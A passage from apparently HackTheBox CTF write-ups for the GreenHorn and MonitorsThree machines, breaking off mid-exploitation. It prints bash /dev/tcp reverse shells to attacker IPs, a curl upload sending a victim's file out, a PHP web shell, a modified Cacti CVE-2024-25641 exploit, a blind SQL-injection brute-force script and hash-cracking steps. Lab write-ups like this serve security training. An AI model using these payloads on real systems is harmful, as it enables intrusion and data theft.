http://greenhorn.htb/data/modules/malicious/malicious.php?cmd=&lt;COMMAND&gt;\n[+] Executing command 'bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.11/7777 0&gt;&amp;1''\n</code></pre> <p>And we get successfully get a connection established on our listener:</p> <pre><code>$ rlwrap -cAr nc -lvnp 7777\nlistening on [any] 7777 ...\nconnect to [10.10.16.25] from (UNKNOWN) [10.129.78.209] 38982\nbash: cannot set terminal process group (1003): Inappropriate ioctl for device\nbash: no job control in this shell\nwww-data@greenhorn:~/html/pluck/data/modules/malicious$ id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n\nwww-data@greenhorn:~/html/pluck/data/modules/malicious$ hostname\ngreenhorn\n</code></pre>"}, {"location": "Write-Ups/GreenHorn/#host-enumeration", "title": "Host Enumeration", "text": "<p>Once we are on the host with our reverse shell, we can do some manual enumeration on it and see two users being present:</p> <pre><code>$ cat /etc/passwd | grep sh$\ncat /etc/passwd | grep sh$\nroot:x:0:0:root:/root:/bin/bash\ngit:x:114:120:Git Version Control,,,:/home/git:/bin/bash\njunior:x:1000:1000::/home/junior:/bin/bash\n</code></pre> <p>And trying for password reuse (using <code>iloveyou1</code>) we can successfully authenticate as user <code>junior</code>:</p> <pre><code>$ su -l junior\n\nPassword: iloveyou1\nwhoami\njunior\n</code></pre> <p>We upgrade the shell to a TTY.</p> <pre><code>python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n</code></pre> <p>The user flag can be found in the home directory of <code>junior</code>.</p> <pre><code>$ cat user.txt\n5575bb0446ca9ad25c0ce2c58bad1dbc\n</code></pre> <p>We can also find <code>Using OpenVAS.pdf</code> file in juniors home directory. First we transfer over to our local attack machine.</p> <p>We start an upload server on our attack machine.</p> <pre><code>$ python3 -m uploadserver 8080                                                                                                       \nFile upload available at /upload\nServing HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...\n</code></pre> <p>Next on the target host we upload the file using curl:</p> <pre><code>$ curl -X POST http://10.10.16.11:8080/upload -F 'files=@/home/junior/Using OpenVAS.pdf' --insecure\n</code></pre> <p>And we successfully receive the file on our local machine.</p> <pre><code>10.129.87.59 - - [07/Dec/2024 17:38:25] [Uploaded] \"Using OpenVAS.pdf\" --&gt; /home/kali/htb/greenhorn/Using OpenVAS.pdf\n10.129.87.59 - - [07/Dec/2024 17:38:25] \"POST /upload HTTP/1.1\" 204 -\n</code></pre>"}, {"location": "Write-Ups/GreenHorn/#privilege-escalation", "title": "Privilege Escalation", "text": "<p>Opening the PDF document, we can see the following:</p> <p></p> <p>A blurred out password is present, which can potentially be abused using depixelization tools. </p> <p>In the following we use the Depix tool to try this approach.</p> <p>We first need to extract the blurred password image. So right-click on the blurred text and save as image.</p> <p></p> <p>Once saved, we can run the <code>Depix</code> tool on the image from within the cloned <code>Depix</code> repository directory:</p> <pre><code>$ python3 depix.py -p ~/htb/greenhorn/pixel.png -s images/searchimages/&lt;IMAGE_PNG&gt;\n</code></pre> <p>We try a few <code>&lt;IMAGE_PNG&gt;</code> images inside the <code>./images/searchimages/</code> directory on the pixelated image we saved and open them:</p> <pre><code>$ open output.png\n</code></pre> <p>Eventually we can unblur the image using the following search image:</p> <pre><code>$ python3 depix.py -p ~/htb/greenhorn/pixel.png -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png\n</code></pre> <p>This reveals a readable password, spelling <code>sidefromsidetheothersidesidefromsidetheotherside</code>.</p> <p></p> <p>Since the PDF mentioned that \"only the root user\" can execute the <code>openvas</code> command using this password, it is safe to assume that this is the password for the root user.</p> <p>So we try to login as the root user:</p> <pre><code>$ su -l\nPassword: sidefromsidetheothersidesidefromsidetheotherside\n\nroot@greenhorn:~# id\nuid=0(root) gid=0(root) groups=0(root)\n\nroot@greenhorn:~# hostname\ngreenhorn\n</code></pre> <p>And we successfully escalated privileges and can get the root flag.</p> <pre><code>$ cat root.txt\n8042b17f8b4311c9c687a403d8fa9197\n</code></pre>"}, {"location": "Write-Ups/GreenHorn/#resources", "title": "Resources", "text": "<ul> <li>Depix tool</li> <li>Depix blog post about image depixelization</li> <li>Alternative tool Unredacter</li> <li>Unredacter blog post about image depixelization</li> </ul>"}, {"location": "Write-Ups/GreenHorn/#remediation", "title": "Remediation", "text": "<ul> <li>Gitea sensitive information disclosure. Exclude pass.php using <code>Git</code> excludes.</li> <li>Gitea use stronger password, so it is less susceptible to cracking attempts.</li> <li>Patch vulnerable version of Pluck CMS.</li> <li>Do not reuse passwords.</li> <li>Dont blur images to try and hide sensitive information, as they can often be depixelized back to to readable format. Use  syntax or put a bar over the field containing sensitive information."}, {"location": "Write-Ups/MonitorsThree/", "title": "MonitorsThree", "text": "<p>We first start with an Nmap scan to enumerate ports and services available.</p> <pre><code>$ sudo nmap -p22,80,8084 -vv -sC -sV -oN nmap-full 10.129.231.115\nNmap scan report for 10.129.231.115\nHost is up, received echo-reply ttl 63 (0.027s latency).\nScanned at 2024-12-03 23:39:03 CET for 10s\n\nPORT     STATE    SERVICE REASON         VERSION\n22/tcp   open     ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 86:f8:7d:6f:42:91:bb:89:72:91:af:72:f3:01:ff:5b (ECDSA)\n| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNwl884vMmev5jgPEogyyLoyjEHsq+F9DzOCgtCA4P8TH2TQcymOgliq7Yzf7x1tL+i2mJedm2BGMKOv1NXXfN0=\n|   256 50:f9:ed:8e:73:64:9e:aa:f6:08:95:14:f0:a6:0d:57 (ED25519)\n|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN5W5QMRdl0vUKFiq9AiP+TVxKIgpRQNyo25qNs248Pa\n80/tcp   open     http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)\n|_http-title: Did not follow redirect to http://monitorsthree.htb/\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\n8084/tcp filtered websnp  no-response\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nRead data files from: /usr/share/nmap\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done at Tue Dec  3 23:39:13 2024 -- 1 IP address (1 host up) scanned in 11.27 seconds\n</code></pre> <ul> <li>SSH on 22/TCP - Reveals Linux machine (Ubuntu + TTL 63)</li> <li>HTTP on 80/TCP - Redirects to <code>http://monitorsthree.htb/</code> | Running <code>nginx</code></li> </ul> <p>Add the redirect <code>monitorsthree.htb</code> to <code>/etc/hosts</code>.</p> <p>Continue with visiting the website to see what's going on. Generic site, however login page at <code>/login.php</code>. Trying some common credentials does not net us a successful login. </p> <p></p> <p>We decide to fuzz the website for directories as well as pages with the <code>.php</code> extension, since we see <code>index.php</code>. The Ffuf tool is used to perform this.</p> <pre><code>$ ffuf -u \"http://monitorsthree.htb/FUZZ\" -e php -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -ic\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://monitorsthree.htb/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt\n :: Extensions       : php \n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n________________________________________________\n\nimages                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 21ms]\n                        [Status: 200, Size: 13560, Words: 3598, Lines: 338, Duration: 26ms]\nadmin                   [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 36ms]\ncss                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 25ms]\njs                      [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 31ms]\nfonts                   [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 32ms]\n&lt;--SNIP--&gt;\n</code></pre> <p>Not much of interest found other than the <code>/admin</code> directory. </p> <p>We fuzz again, this time to try and discover subdomains/vhosts.</p> <pre><code>$ ffuf -u http://monitorsthree.htb -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -ic -H \"Host: FUZZ.monitorsthree.htb\" -fs 13560 \n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://monitorsthree.htb\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt\n :: Header           : Host: FUZZ.monitorsthree.htb\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response size: 13560\n________________________________________________\n\ncacti                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 39ms]\n&lt;--SNIP--&gt;\n</code></pre> <p>The subdomain <code>cacti.monitorsthree.htb</code> was successfully discovered.</p> <p>Upon visiting this subdomain we can find a <code>cacti</code> instance running on version 1.2.26. This version is vulnerable, however we need to be authenticated in order to exploit the vulnerability. We keep this information in mind to potentially use later. </p> <p>Doing some more manual enumeration and we discover a potential SQL Injection vulnerability on the website at <code>/forgot_password.php</code>. </p> <p>By sending the <code>'</code> character as input on the <code>Reset Password</code> functionality we can observe an SQL error being thrown, which can be indicative of a potential SQL Injection vulnerability.</p> <p></p> <p>We continue by capturing the full <code>POST</code> request being made by using Burpsuite. <pre><code>$ cat forgot-password.req \nPOST /forgot_password.php HTTP/1.1\nHost: monitorsthree.htb\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 12\nOrigin: http://monitorsthree.htb\nConnection: keep-alive\nReferer: http://monitorsthree.htb/forgot_password.php\nCookie: PHPSESSID=ekfs7dr2h53tlh55k4609igomt\nUpgrade-Insecure-Requests: 1\nPriority: u=0, i\n\nusername=test\n</code></pre></p> <p>Next SQLMap is being used to potentially find an SQL Injection vulnerability. It will also enable us to easily enumerate the database as well as exfiltrate sensitive data. </p> <p><pre><code>$ sqlmap -r forgot-password.req --batch --threads 10 --dbms=mysql                                           \n\n        ___                                 \n       __H__                                                                                                \n ___ ___[.]_____ ___ ___  {1.8.11#stable}\n|_ -| . [(]     | .'| . |\n|___|_  [.]_|_|_|__,|  _|                    \n      |_|V...       |_|   https://sqlmap.org                                                                                                \n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by \nthis program                                                          \n[*] starting @ 00:33:53 /2024-12-04/\n&lt;--SNIP--&gt;\nParameter: username (POST)                        \n    Type: time-based blind\n    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: username=test' AND (SELECT 6627 FROM (SELECT(SLEEP(5)))RodK) AND 'jRxj'='jRxj                  ---                       [00:36:35] [INFO] the back-end DBMS is MySQL                          \n&lt;--SNIP--&gt;                                                                         \n[*] ending @ 00:37:00 /2024-12-04/\n</code></pre> We successfully discover a time-based SQL Injection. Due to the time-based injection however, it can take a long time to enumerate as well as exfiltrate data.</p> <p>Because we manually tried for SQL Injection to discover issues in the first place, we know there could potentially be other types of SQL Injection as well.</p> <p>We can try to increase <code>--level</code> and <code>--risk</code> flags as well as specifying the error-based or union SQL Injection type by using <code>--technique</code> for SQLMap to maybe find a \"better\" SQL Injection type.</p> <p>Furthermore we note down the discovered DBMS as being MySQL (MariaDB). <pre><code>$ sqlmap -r forgot-password.req --batch --threads 10 --dbms=mysql --technique=BEUSQ --level 5 --risk 3 -p username\n&lt;--SNIP--&gt;\nPOST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N\nsqlmap identified the following injection point(s) with a total of 2253 HTTP(s) requests:\n---\nParameter: username (POST)\n    Type: stacked queries\n    Title: MySQL &gt;= 5.0.12 stacked queries (comment)\n    Payload: username=test';SELECT SLEEP(5)#\n---\n&lt;--SNIP--&gt;\n</code></pre> Everything SQLMap finds seems to be time-based, so we will try to do it manually. The approach here is to try a union-based injection in conjunction with an error-based injection. We try to determine information from the database by looking at the errors thrown from the database.</p> <p>By increasing the <code>null</code> columns in the <code>union</code> statement, We finally inject the following payload in the <code>username</code> field and observe a different database response. <pre><code>' union select null,null,null,null,null,null,null,null,null-- -\n</code></pre></p> <p></p> <p>We now know that we are dealing with 9 columns in the current table. The problem here is that there is no output on the website for any of the columns, so we have extract valid data by differentiating between errors and valid responses from the database. Thus not allowing us to simply do a union injection based approach.</p> <p>Our next step now is to try and enumerate the database further, gaining information about its schema. We decide to first get valid tables by changing one of the <code>null</code> columns into a <code>SELECT</code> statement with a table name that most likely doesn't exist. We can observe the error message, validating that the table doesn't exist. We also get the database name: <code>monitorsthree_db</code>.</p> <pre><code>' union select null,null,null,null,(select * from ds),null,null,null,null-- -\n</code></pre> <p></p> <p>Continue by trying common table names, such as any variations on the name <code>user</code>. We do this because we can most certainly assume that this database contains some user information, since we saw a login page as well as the password reset functionality. After some tries we can observe a different error message by querying the <code>users</code> table.</p> <p><pre><code>' union select null,null,null,null,(select * from users),null,null,null,null-- -\n</code></pre> </p> <p>This error boils down to us trying to do our union query with an unequal amount of columns, because it always has to be the same number. The <code>users</code> table we are querying appears to have more than one column, thus resulting in the outer union query to fail.</p> <p>We could try and delete some <code>null</code> columns in our payload to determine the number of columns in the <code>users</code> table, however we could also assume that the actual query to reset the password is being performed on the <code>users</code> table. Since this initial query is on a table with 9 columns, we try to verify the latter by simply deleting our <code>null</code> columns.</p> <pre><code>' union select * from users-- -\n</code></pre> <p>No error is observed, so we can confirm the <code>users</code> table also has 9 columns and we can most likely conclude that we are in the <code>users</code> table as well.</p> <p>Next we try to determine the column names of the <code>users</code> table by following the same approach we did to find the <code>users</code> table. So we try some likely column names in a <code>WHERE</code> clause and find the <code>username</code> column name to be valid.</p> <p>Once again using the same approach we try to enumerate possible users, first trying a bogus username:</p> <pre><code>' union select * from users where username='dsa'-- -\n</code></pre> <p></p> <p>Next we try a common username that is almost always present, such as <code>administrator</code> or <code>admin</code> and successfully find a user.</p> <pre><code>' union select * from users where username='admin'-- -\n</code></pre> <p></p> <p>Further enumerating column names, we find the <code>password</code> column as being valid.</p> <pre><code>' union select * from users where username='admin' and password='dsamog'-- -\n</code></pre> <p>From here we can try to brute-force it. We will go with the approach to enumerate it character by character, by first getting the actual length of the password and then brute-force it one character at a time.</p> <p>For this, we create the following Python script: <pre><code>$ cat brute.py\nimport requests\nimport string\nfrom termcolor import colored\nfrom itertools import combinations_with_replacement\n\n# Target URL\ntarget = \"http://monitorsthree.htb/forgot_password.php\"\n\ndef get_password_length():\n        payload = \"' union select * from users where username='admin' and length(password)={len_pw}-- -\"\n        print(\"[.] Getting password length\")\n        for i in range(0,64):\n                req = requests.post(target,data={'username':payload.format(len_pw=i)})\n                if (\"Successfully\" in req.text):\n                        print(colored(f\"[!] Determined password length as {i}\", 'green'))\n                        return i\n\ndef get_password(len):\n        chars = string.ascii_letters + string.digits\n        payload_brute = \"' union select * from users where username='admin' and password='{brute}%'-- -\"\n        payload_like = \"' union select * from users where username='admin' and password like '{like}%'-- -\"\n        print(f\"[.] Brute-forcing password with following options:\\n\\t[-&gt;] Length: {len}\\n\\t[-&gt;] Characters: {chars}\")\n        password_like = \"\"\n        for i in range(0,len+1):\n                for char in chars:\n                        #adjusted = password_like + char\n                        req = requests.post(target,data={'username':payload_like.format(like=password_like+char)})\n                        if (f\"Successfully\" in req.text):\n                                password_like += char\n                                progress = i+1\n                                print(colored(f\"[-&gt;] Progress ({progress}/32): {password_like}\", 'yellow'),end='\\r',flush=True)\n                                break\n        print(colored(f\"\\n[!] Successfully brute-forced password: {password_like}\", 'green'))\n\nif __name__ == '__main__':\n        password_length = get_password_length()\n        password = get_password(password_length)\n        print(colored(f\"[!] kthxbye!\", 'magenta'))\n</code></pre></p> <p>After executing it, we successfully retrieved the value of the <code>password</code> column for the user <code>admin</code>.</p> <pre><code>$ python3 brute.py\n[.] Getting password length\n[!] Determined password length as 32\n[.] Brute-forcing password with following options:\n        [-&gt;] Length: 32\n        [-&gt;] Characters: abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\n[-&gt;] Progress (32/32): 31a181c8372e3afc59dab863430610e8\n[!] Successfully brute-forced password: 31a181c8372e3afc59dab863430610e8\n[!] kthxbye!\n</code></pre> <p>With this value being of length 32, it can be assumed that this is an MD5 hash. So use <code>CrackStation</code> to try and quickly crack it.</p> <p></p> <p>We successfully get cleartext credentials as <code>admin:greencacti2001</code>. </p> <p>Going back to our initial enumeration phase, this is most likely the credentials for the login page at the <code>cacti.monitorsthree.htb</code> subdomain, so we try them.</p> <p></p> <p>As we saw on the login screen, the version of <code>cacti</code> is 1.2.26. This version has an authenticated RCE vulnerability (CVE-2024-25641) and there's also a PoC available for it.</p> <p>We proceed with copying the PoC script to generate our malicious payload. <pre><code>&lt;?php\n$xmldata = \"&lt;xml&gt;\n   &lt;files&gt;\n       &lt;file&gt;\n           &lt;name&gt;resource/test.php&lt;/name&gt;\n           &lt;data&gt;%s&lt;/data&gt;\n           &lt;filesignature&gt;%s&lt;/filesignature&gt;\n       &lt;/file&gt;\n   &lt;/files&gt;\n   &lt;publickey&gt;%s&lt;/publickey&gt;\n   &lt;signature&gt;&lt;/signature&gt;\n&lt;/xml&gt;\";\n$filedata = \"&lt;?php phpinfo(); ?&gt;\";\n$keypair = openssl_pkey_new(); \n$public_key = openssl_pkey_get_details($keypair)[\"key\"]; \nopenssl_sign($filedata, $filesignature, $keypair, OPENSSL_ALGO_SHA256);\n$data = sprintf($xmldata, base64_encode($filedata), base64_encode($filesignature), base64_encode($public_key));\nopenssl_sign($data, $signature, $keypair, OPENSSL_ALGO_SHA256);\nfile_put_contents(\"test.xml\", str_replace(\"&lt;signature&gt;&lt;/signature&gt;\", \"&lt;signature&gt;\".base64_encode($signature).\"&lt;/signature&gt;\", $data));\nsystem(\"cat test.xml | gzip -9 &gt; test.xml.gz; rm test.xml\");\n?&gt;\n</code></pre></p> <p>Next we create the payload by running the <code>PoC</code> script and the malicious <code>test.xml.gz</code> file is now in our directory.</p> <pre><code>$ php poc.php\n</code></pre> <p>Next we navigate to <code>Import Packages</code> under <code>Import/Export</code> and upload the malicious file.</p> <p></p> <p>After this we click <code>Import</code> on the bottom right to successfully import it. Now we navigate to the location the file has been placed (shown under the <code>Filename</code> column) and we get the PHP version information, thus confirming the vulnerability.</p> <pre><code>http://cacti.monitorsthree.htb/cacti/resource/poc.php\n</code></pre> <p></p> <p>After having confirmed that the exploit works, we craft a malicious PHP web shell.</p> <pre><code>&lt;?php system($_GET['cmd']);?&gt;\n</code></pre> <p>Edit the <code>PoC</code> script to create the malicious payload containing our PHP web shell.</p> <pre><code>&lt;?php\n\n$xmldata = \"&lt;xml&gt;\n   &lt;files&gt;\n       &lt;file&gt;\n           &lt;name&gt;resource/shelly.php&lt;/name&gt;\n           &lt;data&gt;%s&lt;/data&gt;\n           &lt;filesignature&gt;%s&lt;/filesignature&gt;\n       &lt;/file&gt;\n   &lt;/files&gt;\n   &lt;publickey&gt;%s&lt;/publickey&gt;\n   &lt;signature&gt;&lt;/signature&gt;\n&lt;/xml&gt;\";\n$filedata = '&lt;?php system($_GET[\"cmd\"]); ?&gt;';\n$keypair = openssl_pkey_new(); \n$public_key = openssl_pkey_get_details($keypair)[\"key\"]; \nopenssl_sign($filedata, $filesignature, $keypair, OPENSSL_ALGO_SHA256);\n$data = sprintf($xmldata, base64_encode($filedata), base64_encode($filesignature), base64_encode($public_key));\nopenssl_sign($data, $signature, $keypair, OPENSSL_ALGO_SHA256);\nfile_put_contents(\"shelly.xml\", str_replace(\"&lt;signature&gt;&lt;/signature&gt;\", \"&lt;signature&gt;\".base64_encode($signature).\"&lt;/signature&gt;\", $data));\nsystem(\"cat shelly.xml | gzip -9 &gt; shelly.xml.gz; rm shelly.xml\");\n\n?&gt;\n</code></pre> <p>Repeat the steps to import it again and visit the page. We can confirm successful code execution using the <code>id</code> command.</p> <pre><code>http://cacti.monitorsthree.htb/cacti/resource/shelly.php?cmd=id\n</code></pre> <p></p> <p>Next we set up a listener to get a reverse shell.</p> <pre><code>$ rlwrap -cAr nc -lvnp 7777\nlistening on [any] 7777 ...\n</code></pre> <p>To establish the reverse shell connection, we use a simple bash command and deliver it with <code>curl</code>.</p> <pre><code>$ curl -s 'http://cacti.monitorsthree.htb/cacti/resource/shelly.php' --get --data-urlencode \"cmd=bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.35/7777 0&gt;&amp;1'\"\n</code></pre> <p>Upon issuing the command, we get our reverse shell connection established on our listener.</p> <pre><code>connect to [10.10.16.35] from (UNKNOWN) [10.129.231.115] 51716\nbash: cannot set terminal process group (1156): Inappropriate ioctl for device\nbash: no job control in this shell\n\nwww-data@monitorsthree:~/html/cacti/resource$ id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n\nwww-data@monitorsthree:~/html/cacti/resource$ hostname\nmonitorsthree\n</code></pre> <p>Interesting file at <code>~/html/app/admin/db.php</code></p> <p><pre><code>www-data@monitorsthree:~/html/app/admin$ cat db.php\n&lt;?php\n\n$dsn = 'mysql:host=127.0.0.1;port=3306;dbname=monitorsthree_db';\n$username = 'app_user';\n$password = 'php_app_password';\n$options = [\n    PDO::ATTR_ERRMODE =&gt; PDO::ERRMODE_EXCEPTION,\n    PDO::ATTR_DEFAULT_FETCH_MODE =&gt; PDO::FETCH_ASSOC,\n];\n\ntry {\n    $pdo = new PDO($dsn, $username, $password, $options);\n} catch (PDOException $e) {\n    echo 'Connection failed: ' . $e-&gt;getMessage();\n}\n</code></pre> Can try to connect and dump <code>users</code> table, but does not get us further. <pre><code>www-data@monitorsthree:~/html/app/admin$ mysql -u app_user -pphp_app_password monitorsthree_db\n&lt;--SNIP--&gt;\nMariaDB [monitorsthree_db]&gt; select username,password from users;\nselect username,password from users;\n+-----------+----------------------------------+\n| username  | password                         |\n+-----------+----------------------------------+     \n| admin     | 31a181c8372e3afc59dab863430610e8 |\n| mwatson   | c585d01f2eb3e6e1073e92023088a3dd |                      \n| janderson | 1e68b6eb86b45f6d92f8f292428f77ac |\n| dthompson | 633b683cc128fe244b00f176c8a950f5 |         \n+-----------+----------------------------------+\n</code></pre></p> <p>Going back and navigating to the <code>/var/www/html/cacti</code> directory we can look for more interesting files. Two <code>.sql</code> files can be found as well as a few config files. <pre><code>$ find . -iname \"*.sql\" 2&gt;/dev/null\n./docs/audit_schema.sql                                          \n./cacti.sql\n\n$ find . -iname \"*conf*\" 2&gt;/dev/null\n./include/fa/js/conflict-detection.min.js\n./include/fa/js/conflict-detection.js\n./include/fa/svgs/brands/confluence.svg\n./include/config.php\n./include/config.php.dist\n./include/vendor/csrf/csrf-conf.php\n./include/vendor/flag-icons/svgo.config.js\n./tests/tools/cacti.conf\n</code></pre> The <code>./include/config.php</code> file is interesting as it contains database credentials. <pre><code>$ cat ./include/config.php | grep -v '\\#\\|*\\|//' | grep -e '^.'\n&lt;--SNIP--&gt;\n$database_type     = 'mysql';\n$database_default  = 'cacti';\n$database_hostname = 'localhost';\n$database_username = 'cactiuser';\n$database_password = 'cactiuser';\n$database_port     = '3306';\n$database_retries  = 5;\n$database_ssl      = false;\n&lt;--SNIP--&gt;\n</code></pre> We connect to the database with <code>mysql</code>. <pre><code>$ mysql -u cactiuser -pcactiuser cacti\n</code></pre> Proceed to dump the <code>user_auth</code> table to extract hashes for existing users. <pre><code>MariaDB [cacti]&gt; select username,password from user_auth;\nselect username,password from user_auth;\n+----------+--------------------------------------------------------------+\n| username | password                                                     |\n+----------+--------------------------------------------------------------+\n| admin    | $2y$10$tjPSsSP6UovL3OTNeam4Oe24TSRuSRRApmqf5vPinSer3mDuyG90G |\n| guest    | $2y$10$SO8woUvjSFMr1CDo8O3cz.S6uJoqLaTe6/mvIcUuXzKsATo77nLHu |\n| marcus   | $2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK |\n+----------+--------------------------------------------------------------+\n3 rows in set (0.000 sec)\n</code></pre> These hashes are in <code>Bcrypt</code> format. We crack them using Hashcat. <pre><code>$ ./hashcat hashes/monitorsthree/cacti-db.hashes rockyou.txt -m 3200 --username\n&lt;--SNIP--&gt;\n$2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK:12345678910\n</code></pre> Reveals cleartext credentials:</p> <ul> <li><code>marcus:12345678910</code></li> <li><code>guest:guest</code></li> </ul> <p>We login as <code>marcus</code> using the reverse shell connection and issuing the <code>su</code> command, since SSH is blocked (publickey restriction).</p> <p><pre><code>$ su marcus\n$ id\nuid=1000(marcus) gid=1000(marcus) groups=1000(marcus)\n</code></pre> However now we can grab <code>marcus</code> private SSH key and login via SSH. <pre><code>$ ssh -i marcus-id_rsa marcus@10.129.231.115\n</code></pre></p> <p>The user flag can now be obtained.</p> <pre><code>$ cat user.txt\nd4cc53d18837a65652b02641e15fb2c2\n</code></pre> <p>We run <code>netstat</code> command and see local port 8200/TCP open. <pre><code>$ netstat -lntp\nActive Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    \ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   \ntcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   \ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   \ntcp        0      0 127.0.0.1:39891         0.0.0.0:*               LISTEN      -                   \ntcp        0      0 0.0.0.0:8084            0.0.0.0:*               LISTEN      -                   \ntcp        0      0 127.0.0.1:8200          0.0.0.0:*               LISTEN      -                   \ntcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   \ntcp6       0      0 :::22                   :::*                    LISTEN      -                   \ntcp6       0      0 :::80                   :::*                    LISTEN      -\n</code></pre> Then port forward it via SSH. <pre><code>$ ssh -i marcus-id_rsa -L 8200:localhost:8200 marcus@monitorsthree.htb\n</code></pre> Next visit it locally on our attack machine and we get a password prompt.  Search for files containing \"duplicati\" on the target host. <pre><code>$ find / -iname \"*duplicati*\" 2&gt;/dev/null\n/usr/share/Duplicati\n/opt/backups/cacti/duplicati-bb19cdec32e5341b7a9b5d706407e60eb.dblock.zip\n/opt/backups/cacti/duplicati-20240526T162923Z.dlist.zip\n/opt/backups/cacti/duplicati-b292fdbdd5d6d4145b568ab01e0fd754b.dblock.zip\n/opt/backups/cacti/duplicati-bc2d8d70b8eb74c4ea21235385840e608.dblock.zip\n/opt/backups/cacti/duplicati-ie7ca520ceb6b4ae081f78324e10b7b85.dindex.zip\n/opt/backups/cacti/duplicati-iae1400c8c6b742fa9b1552c67034005b.dindex.zip\n/opt/backups/cacti/duplicati-20241203T223605Z.dlist.zip\n/opt/backups/cacti/duplicati-i7329b8d56a284479bade001406b5dec4.dindex.zip\n/opt/backups/cacti/duplicati-20240820T113028Z.dlist.zip\n/opt/duplicati\n/opt/duplicati/config/Duplicati-server.sqlite\n/etc/cron.d/duplicati\n</code></pre> The <code>.zip</code> files as well as  the <code>.sqlite</code> file is interesting so we transfer the database file over to attack machine using <code>scp</code> command and analyze it with <code>sqlite3</code>. <pre><code>$ scp -i marcus-id_rsa marcus@monitorsthree.htb:/opt/duplicati/config/Duplicati-server.sqlite ./duplicate.sqlite\n$ sqlite3 duplicate.sqlite\n</code></pre> In the <code>option</code> table are interesting entries to be found, such as <code>server-passphrase</code> and <code>server-passhphrase-salt</code>. <pre><code>sqlite&gt; select * from option;\n&lt;--SNIP--&gt;\n-2||last-webserver-port|8200\n-2||is-first-run|\n-2||server-port-changed|True\n-2||server-passphrase|Wb6e855L3sN9LTaCuwPXuautswTIQbekmMAr7BrK2Ho=\n-2||server-passphrase-salt|xTfykWV1dATpFZvPhClEJLJzYA5A4L74hX7FK8XmY0I=\n-2||server-passphrase-trayicon|ea395a64-1f0f-4dcb-83ec-e09971cb4e99\n-2||server-passphrase-trayicon-hash|K3pJRrMNcoR8CYT2o0LZkeVM/ds9Hp3yCmhLmYoVMCk=\n</code></pre> Also going back to webpage we find a <code>login.js</code> file with the following contents:  With knowing the <code>server-passphrase</code> from the database, we can bypass the authentication (see here). To exploit this we do the following:</p> <ul> <li>We enter any password and intercept the POST request using BurpSuite.</li> </ul> <p></p> 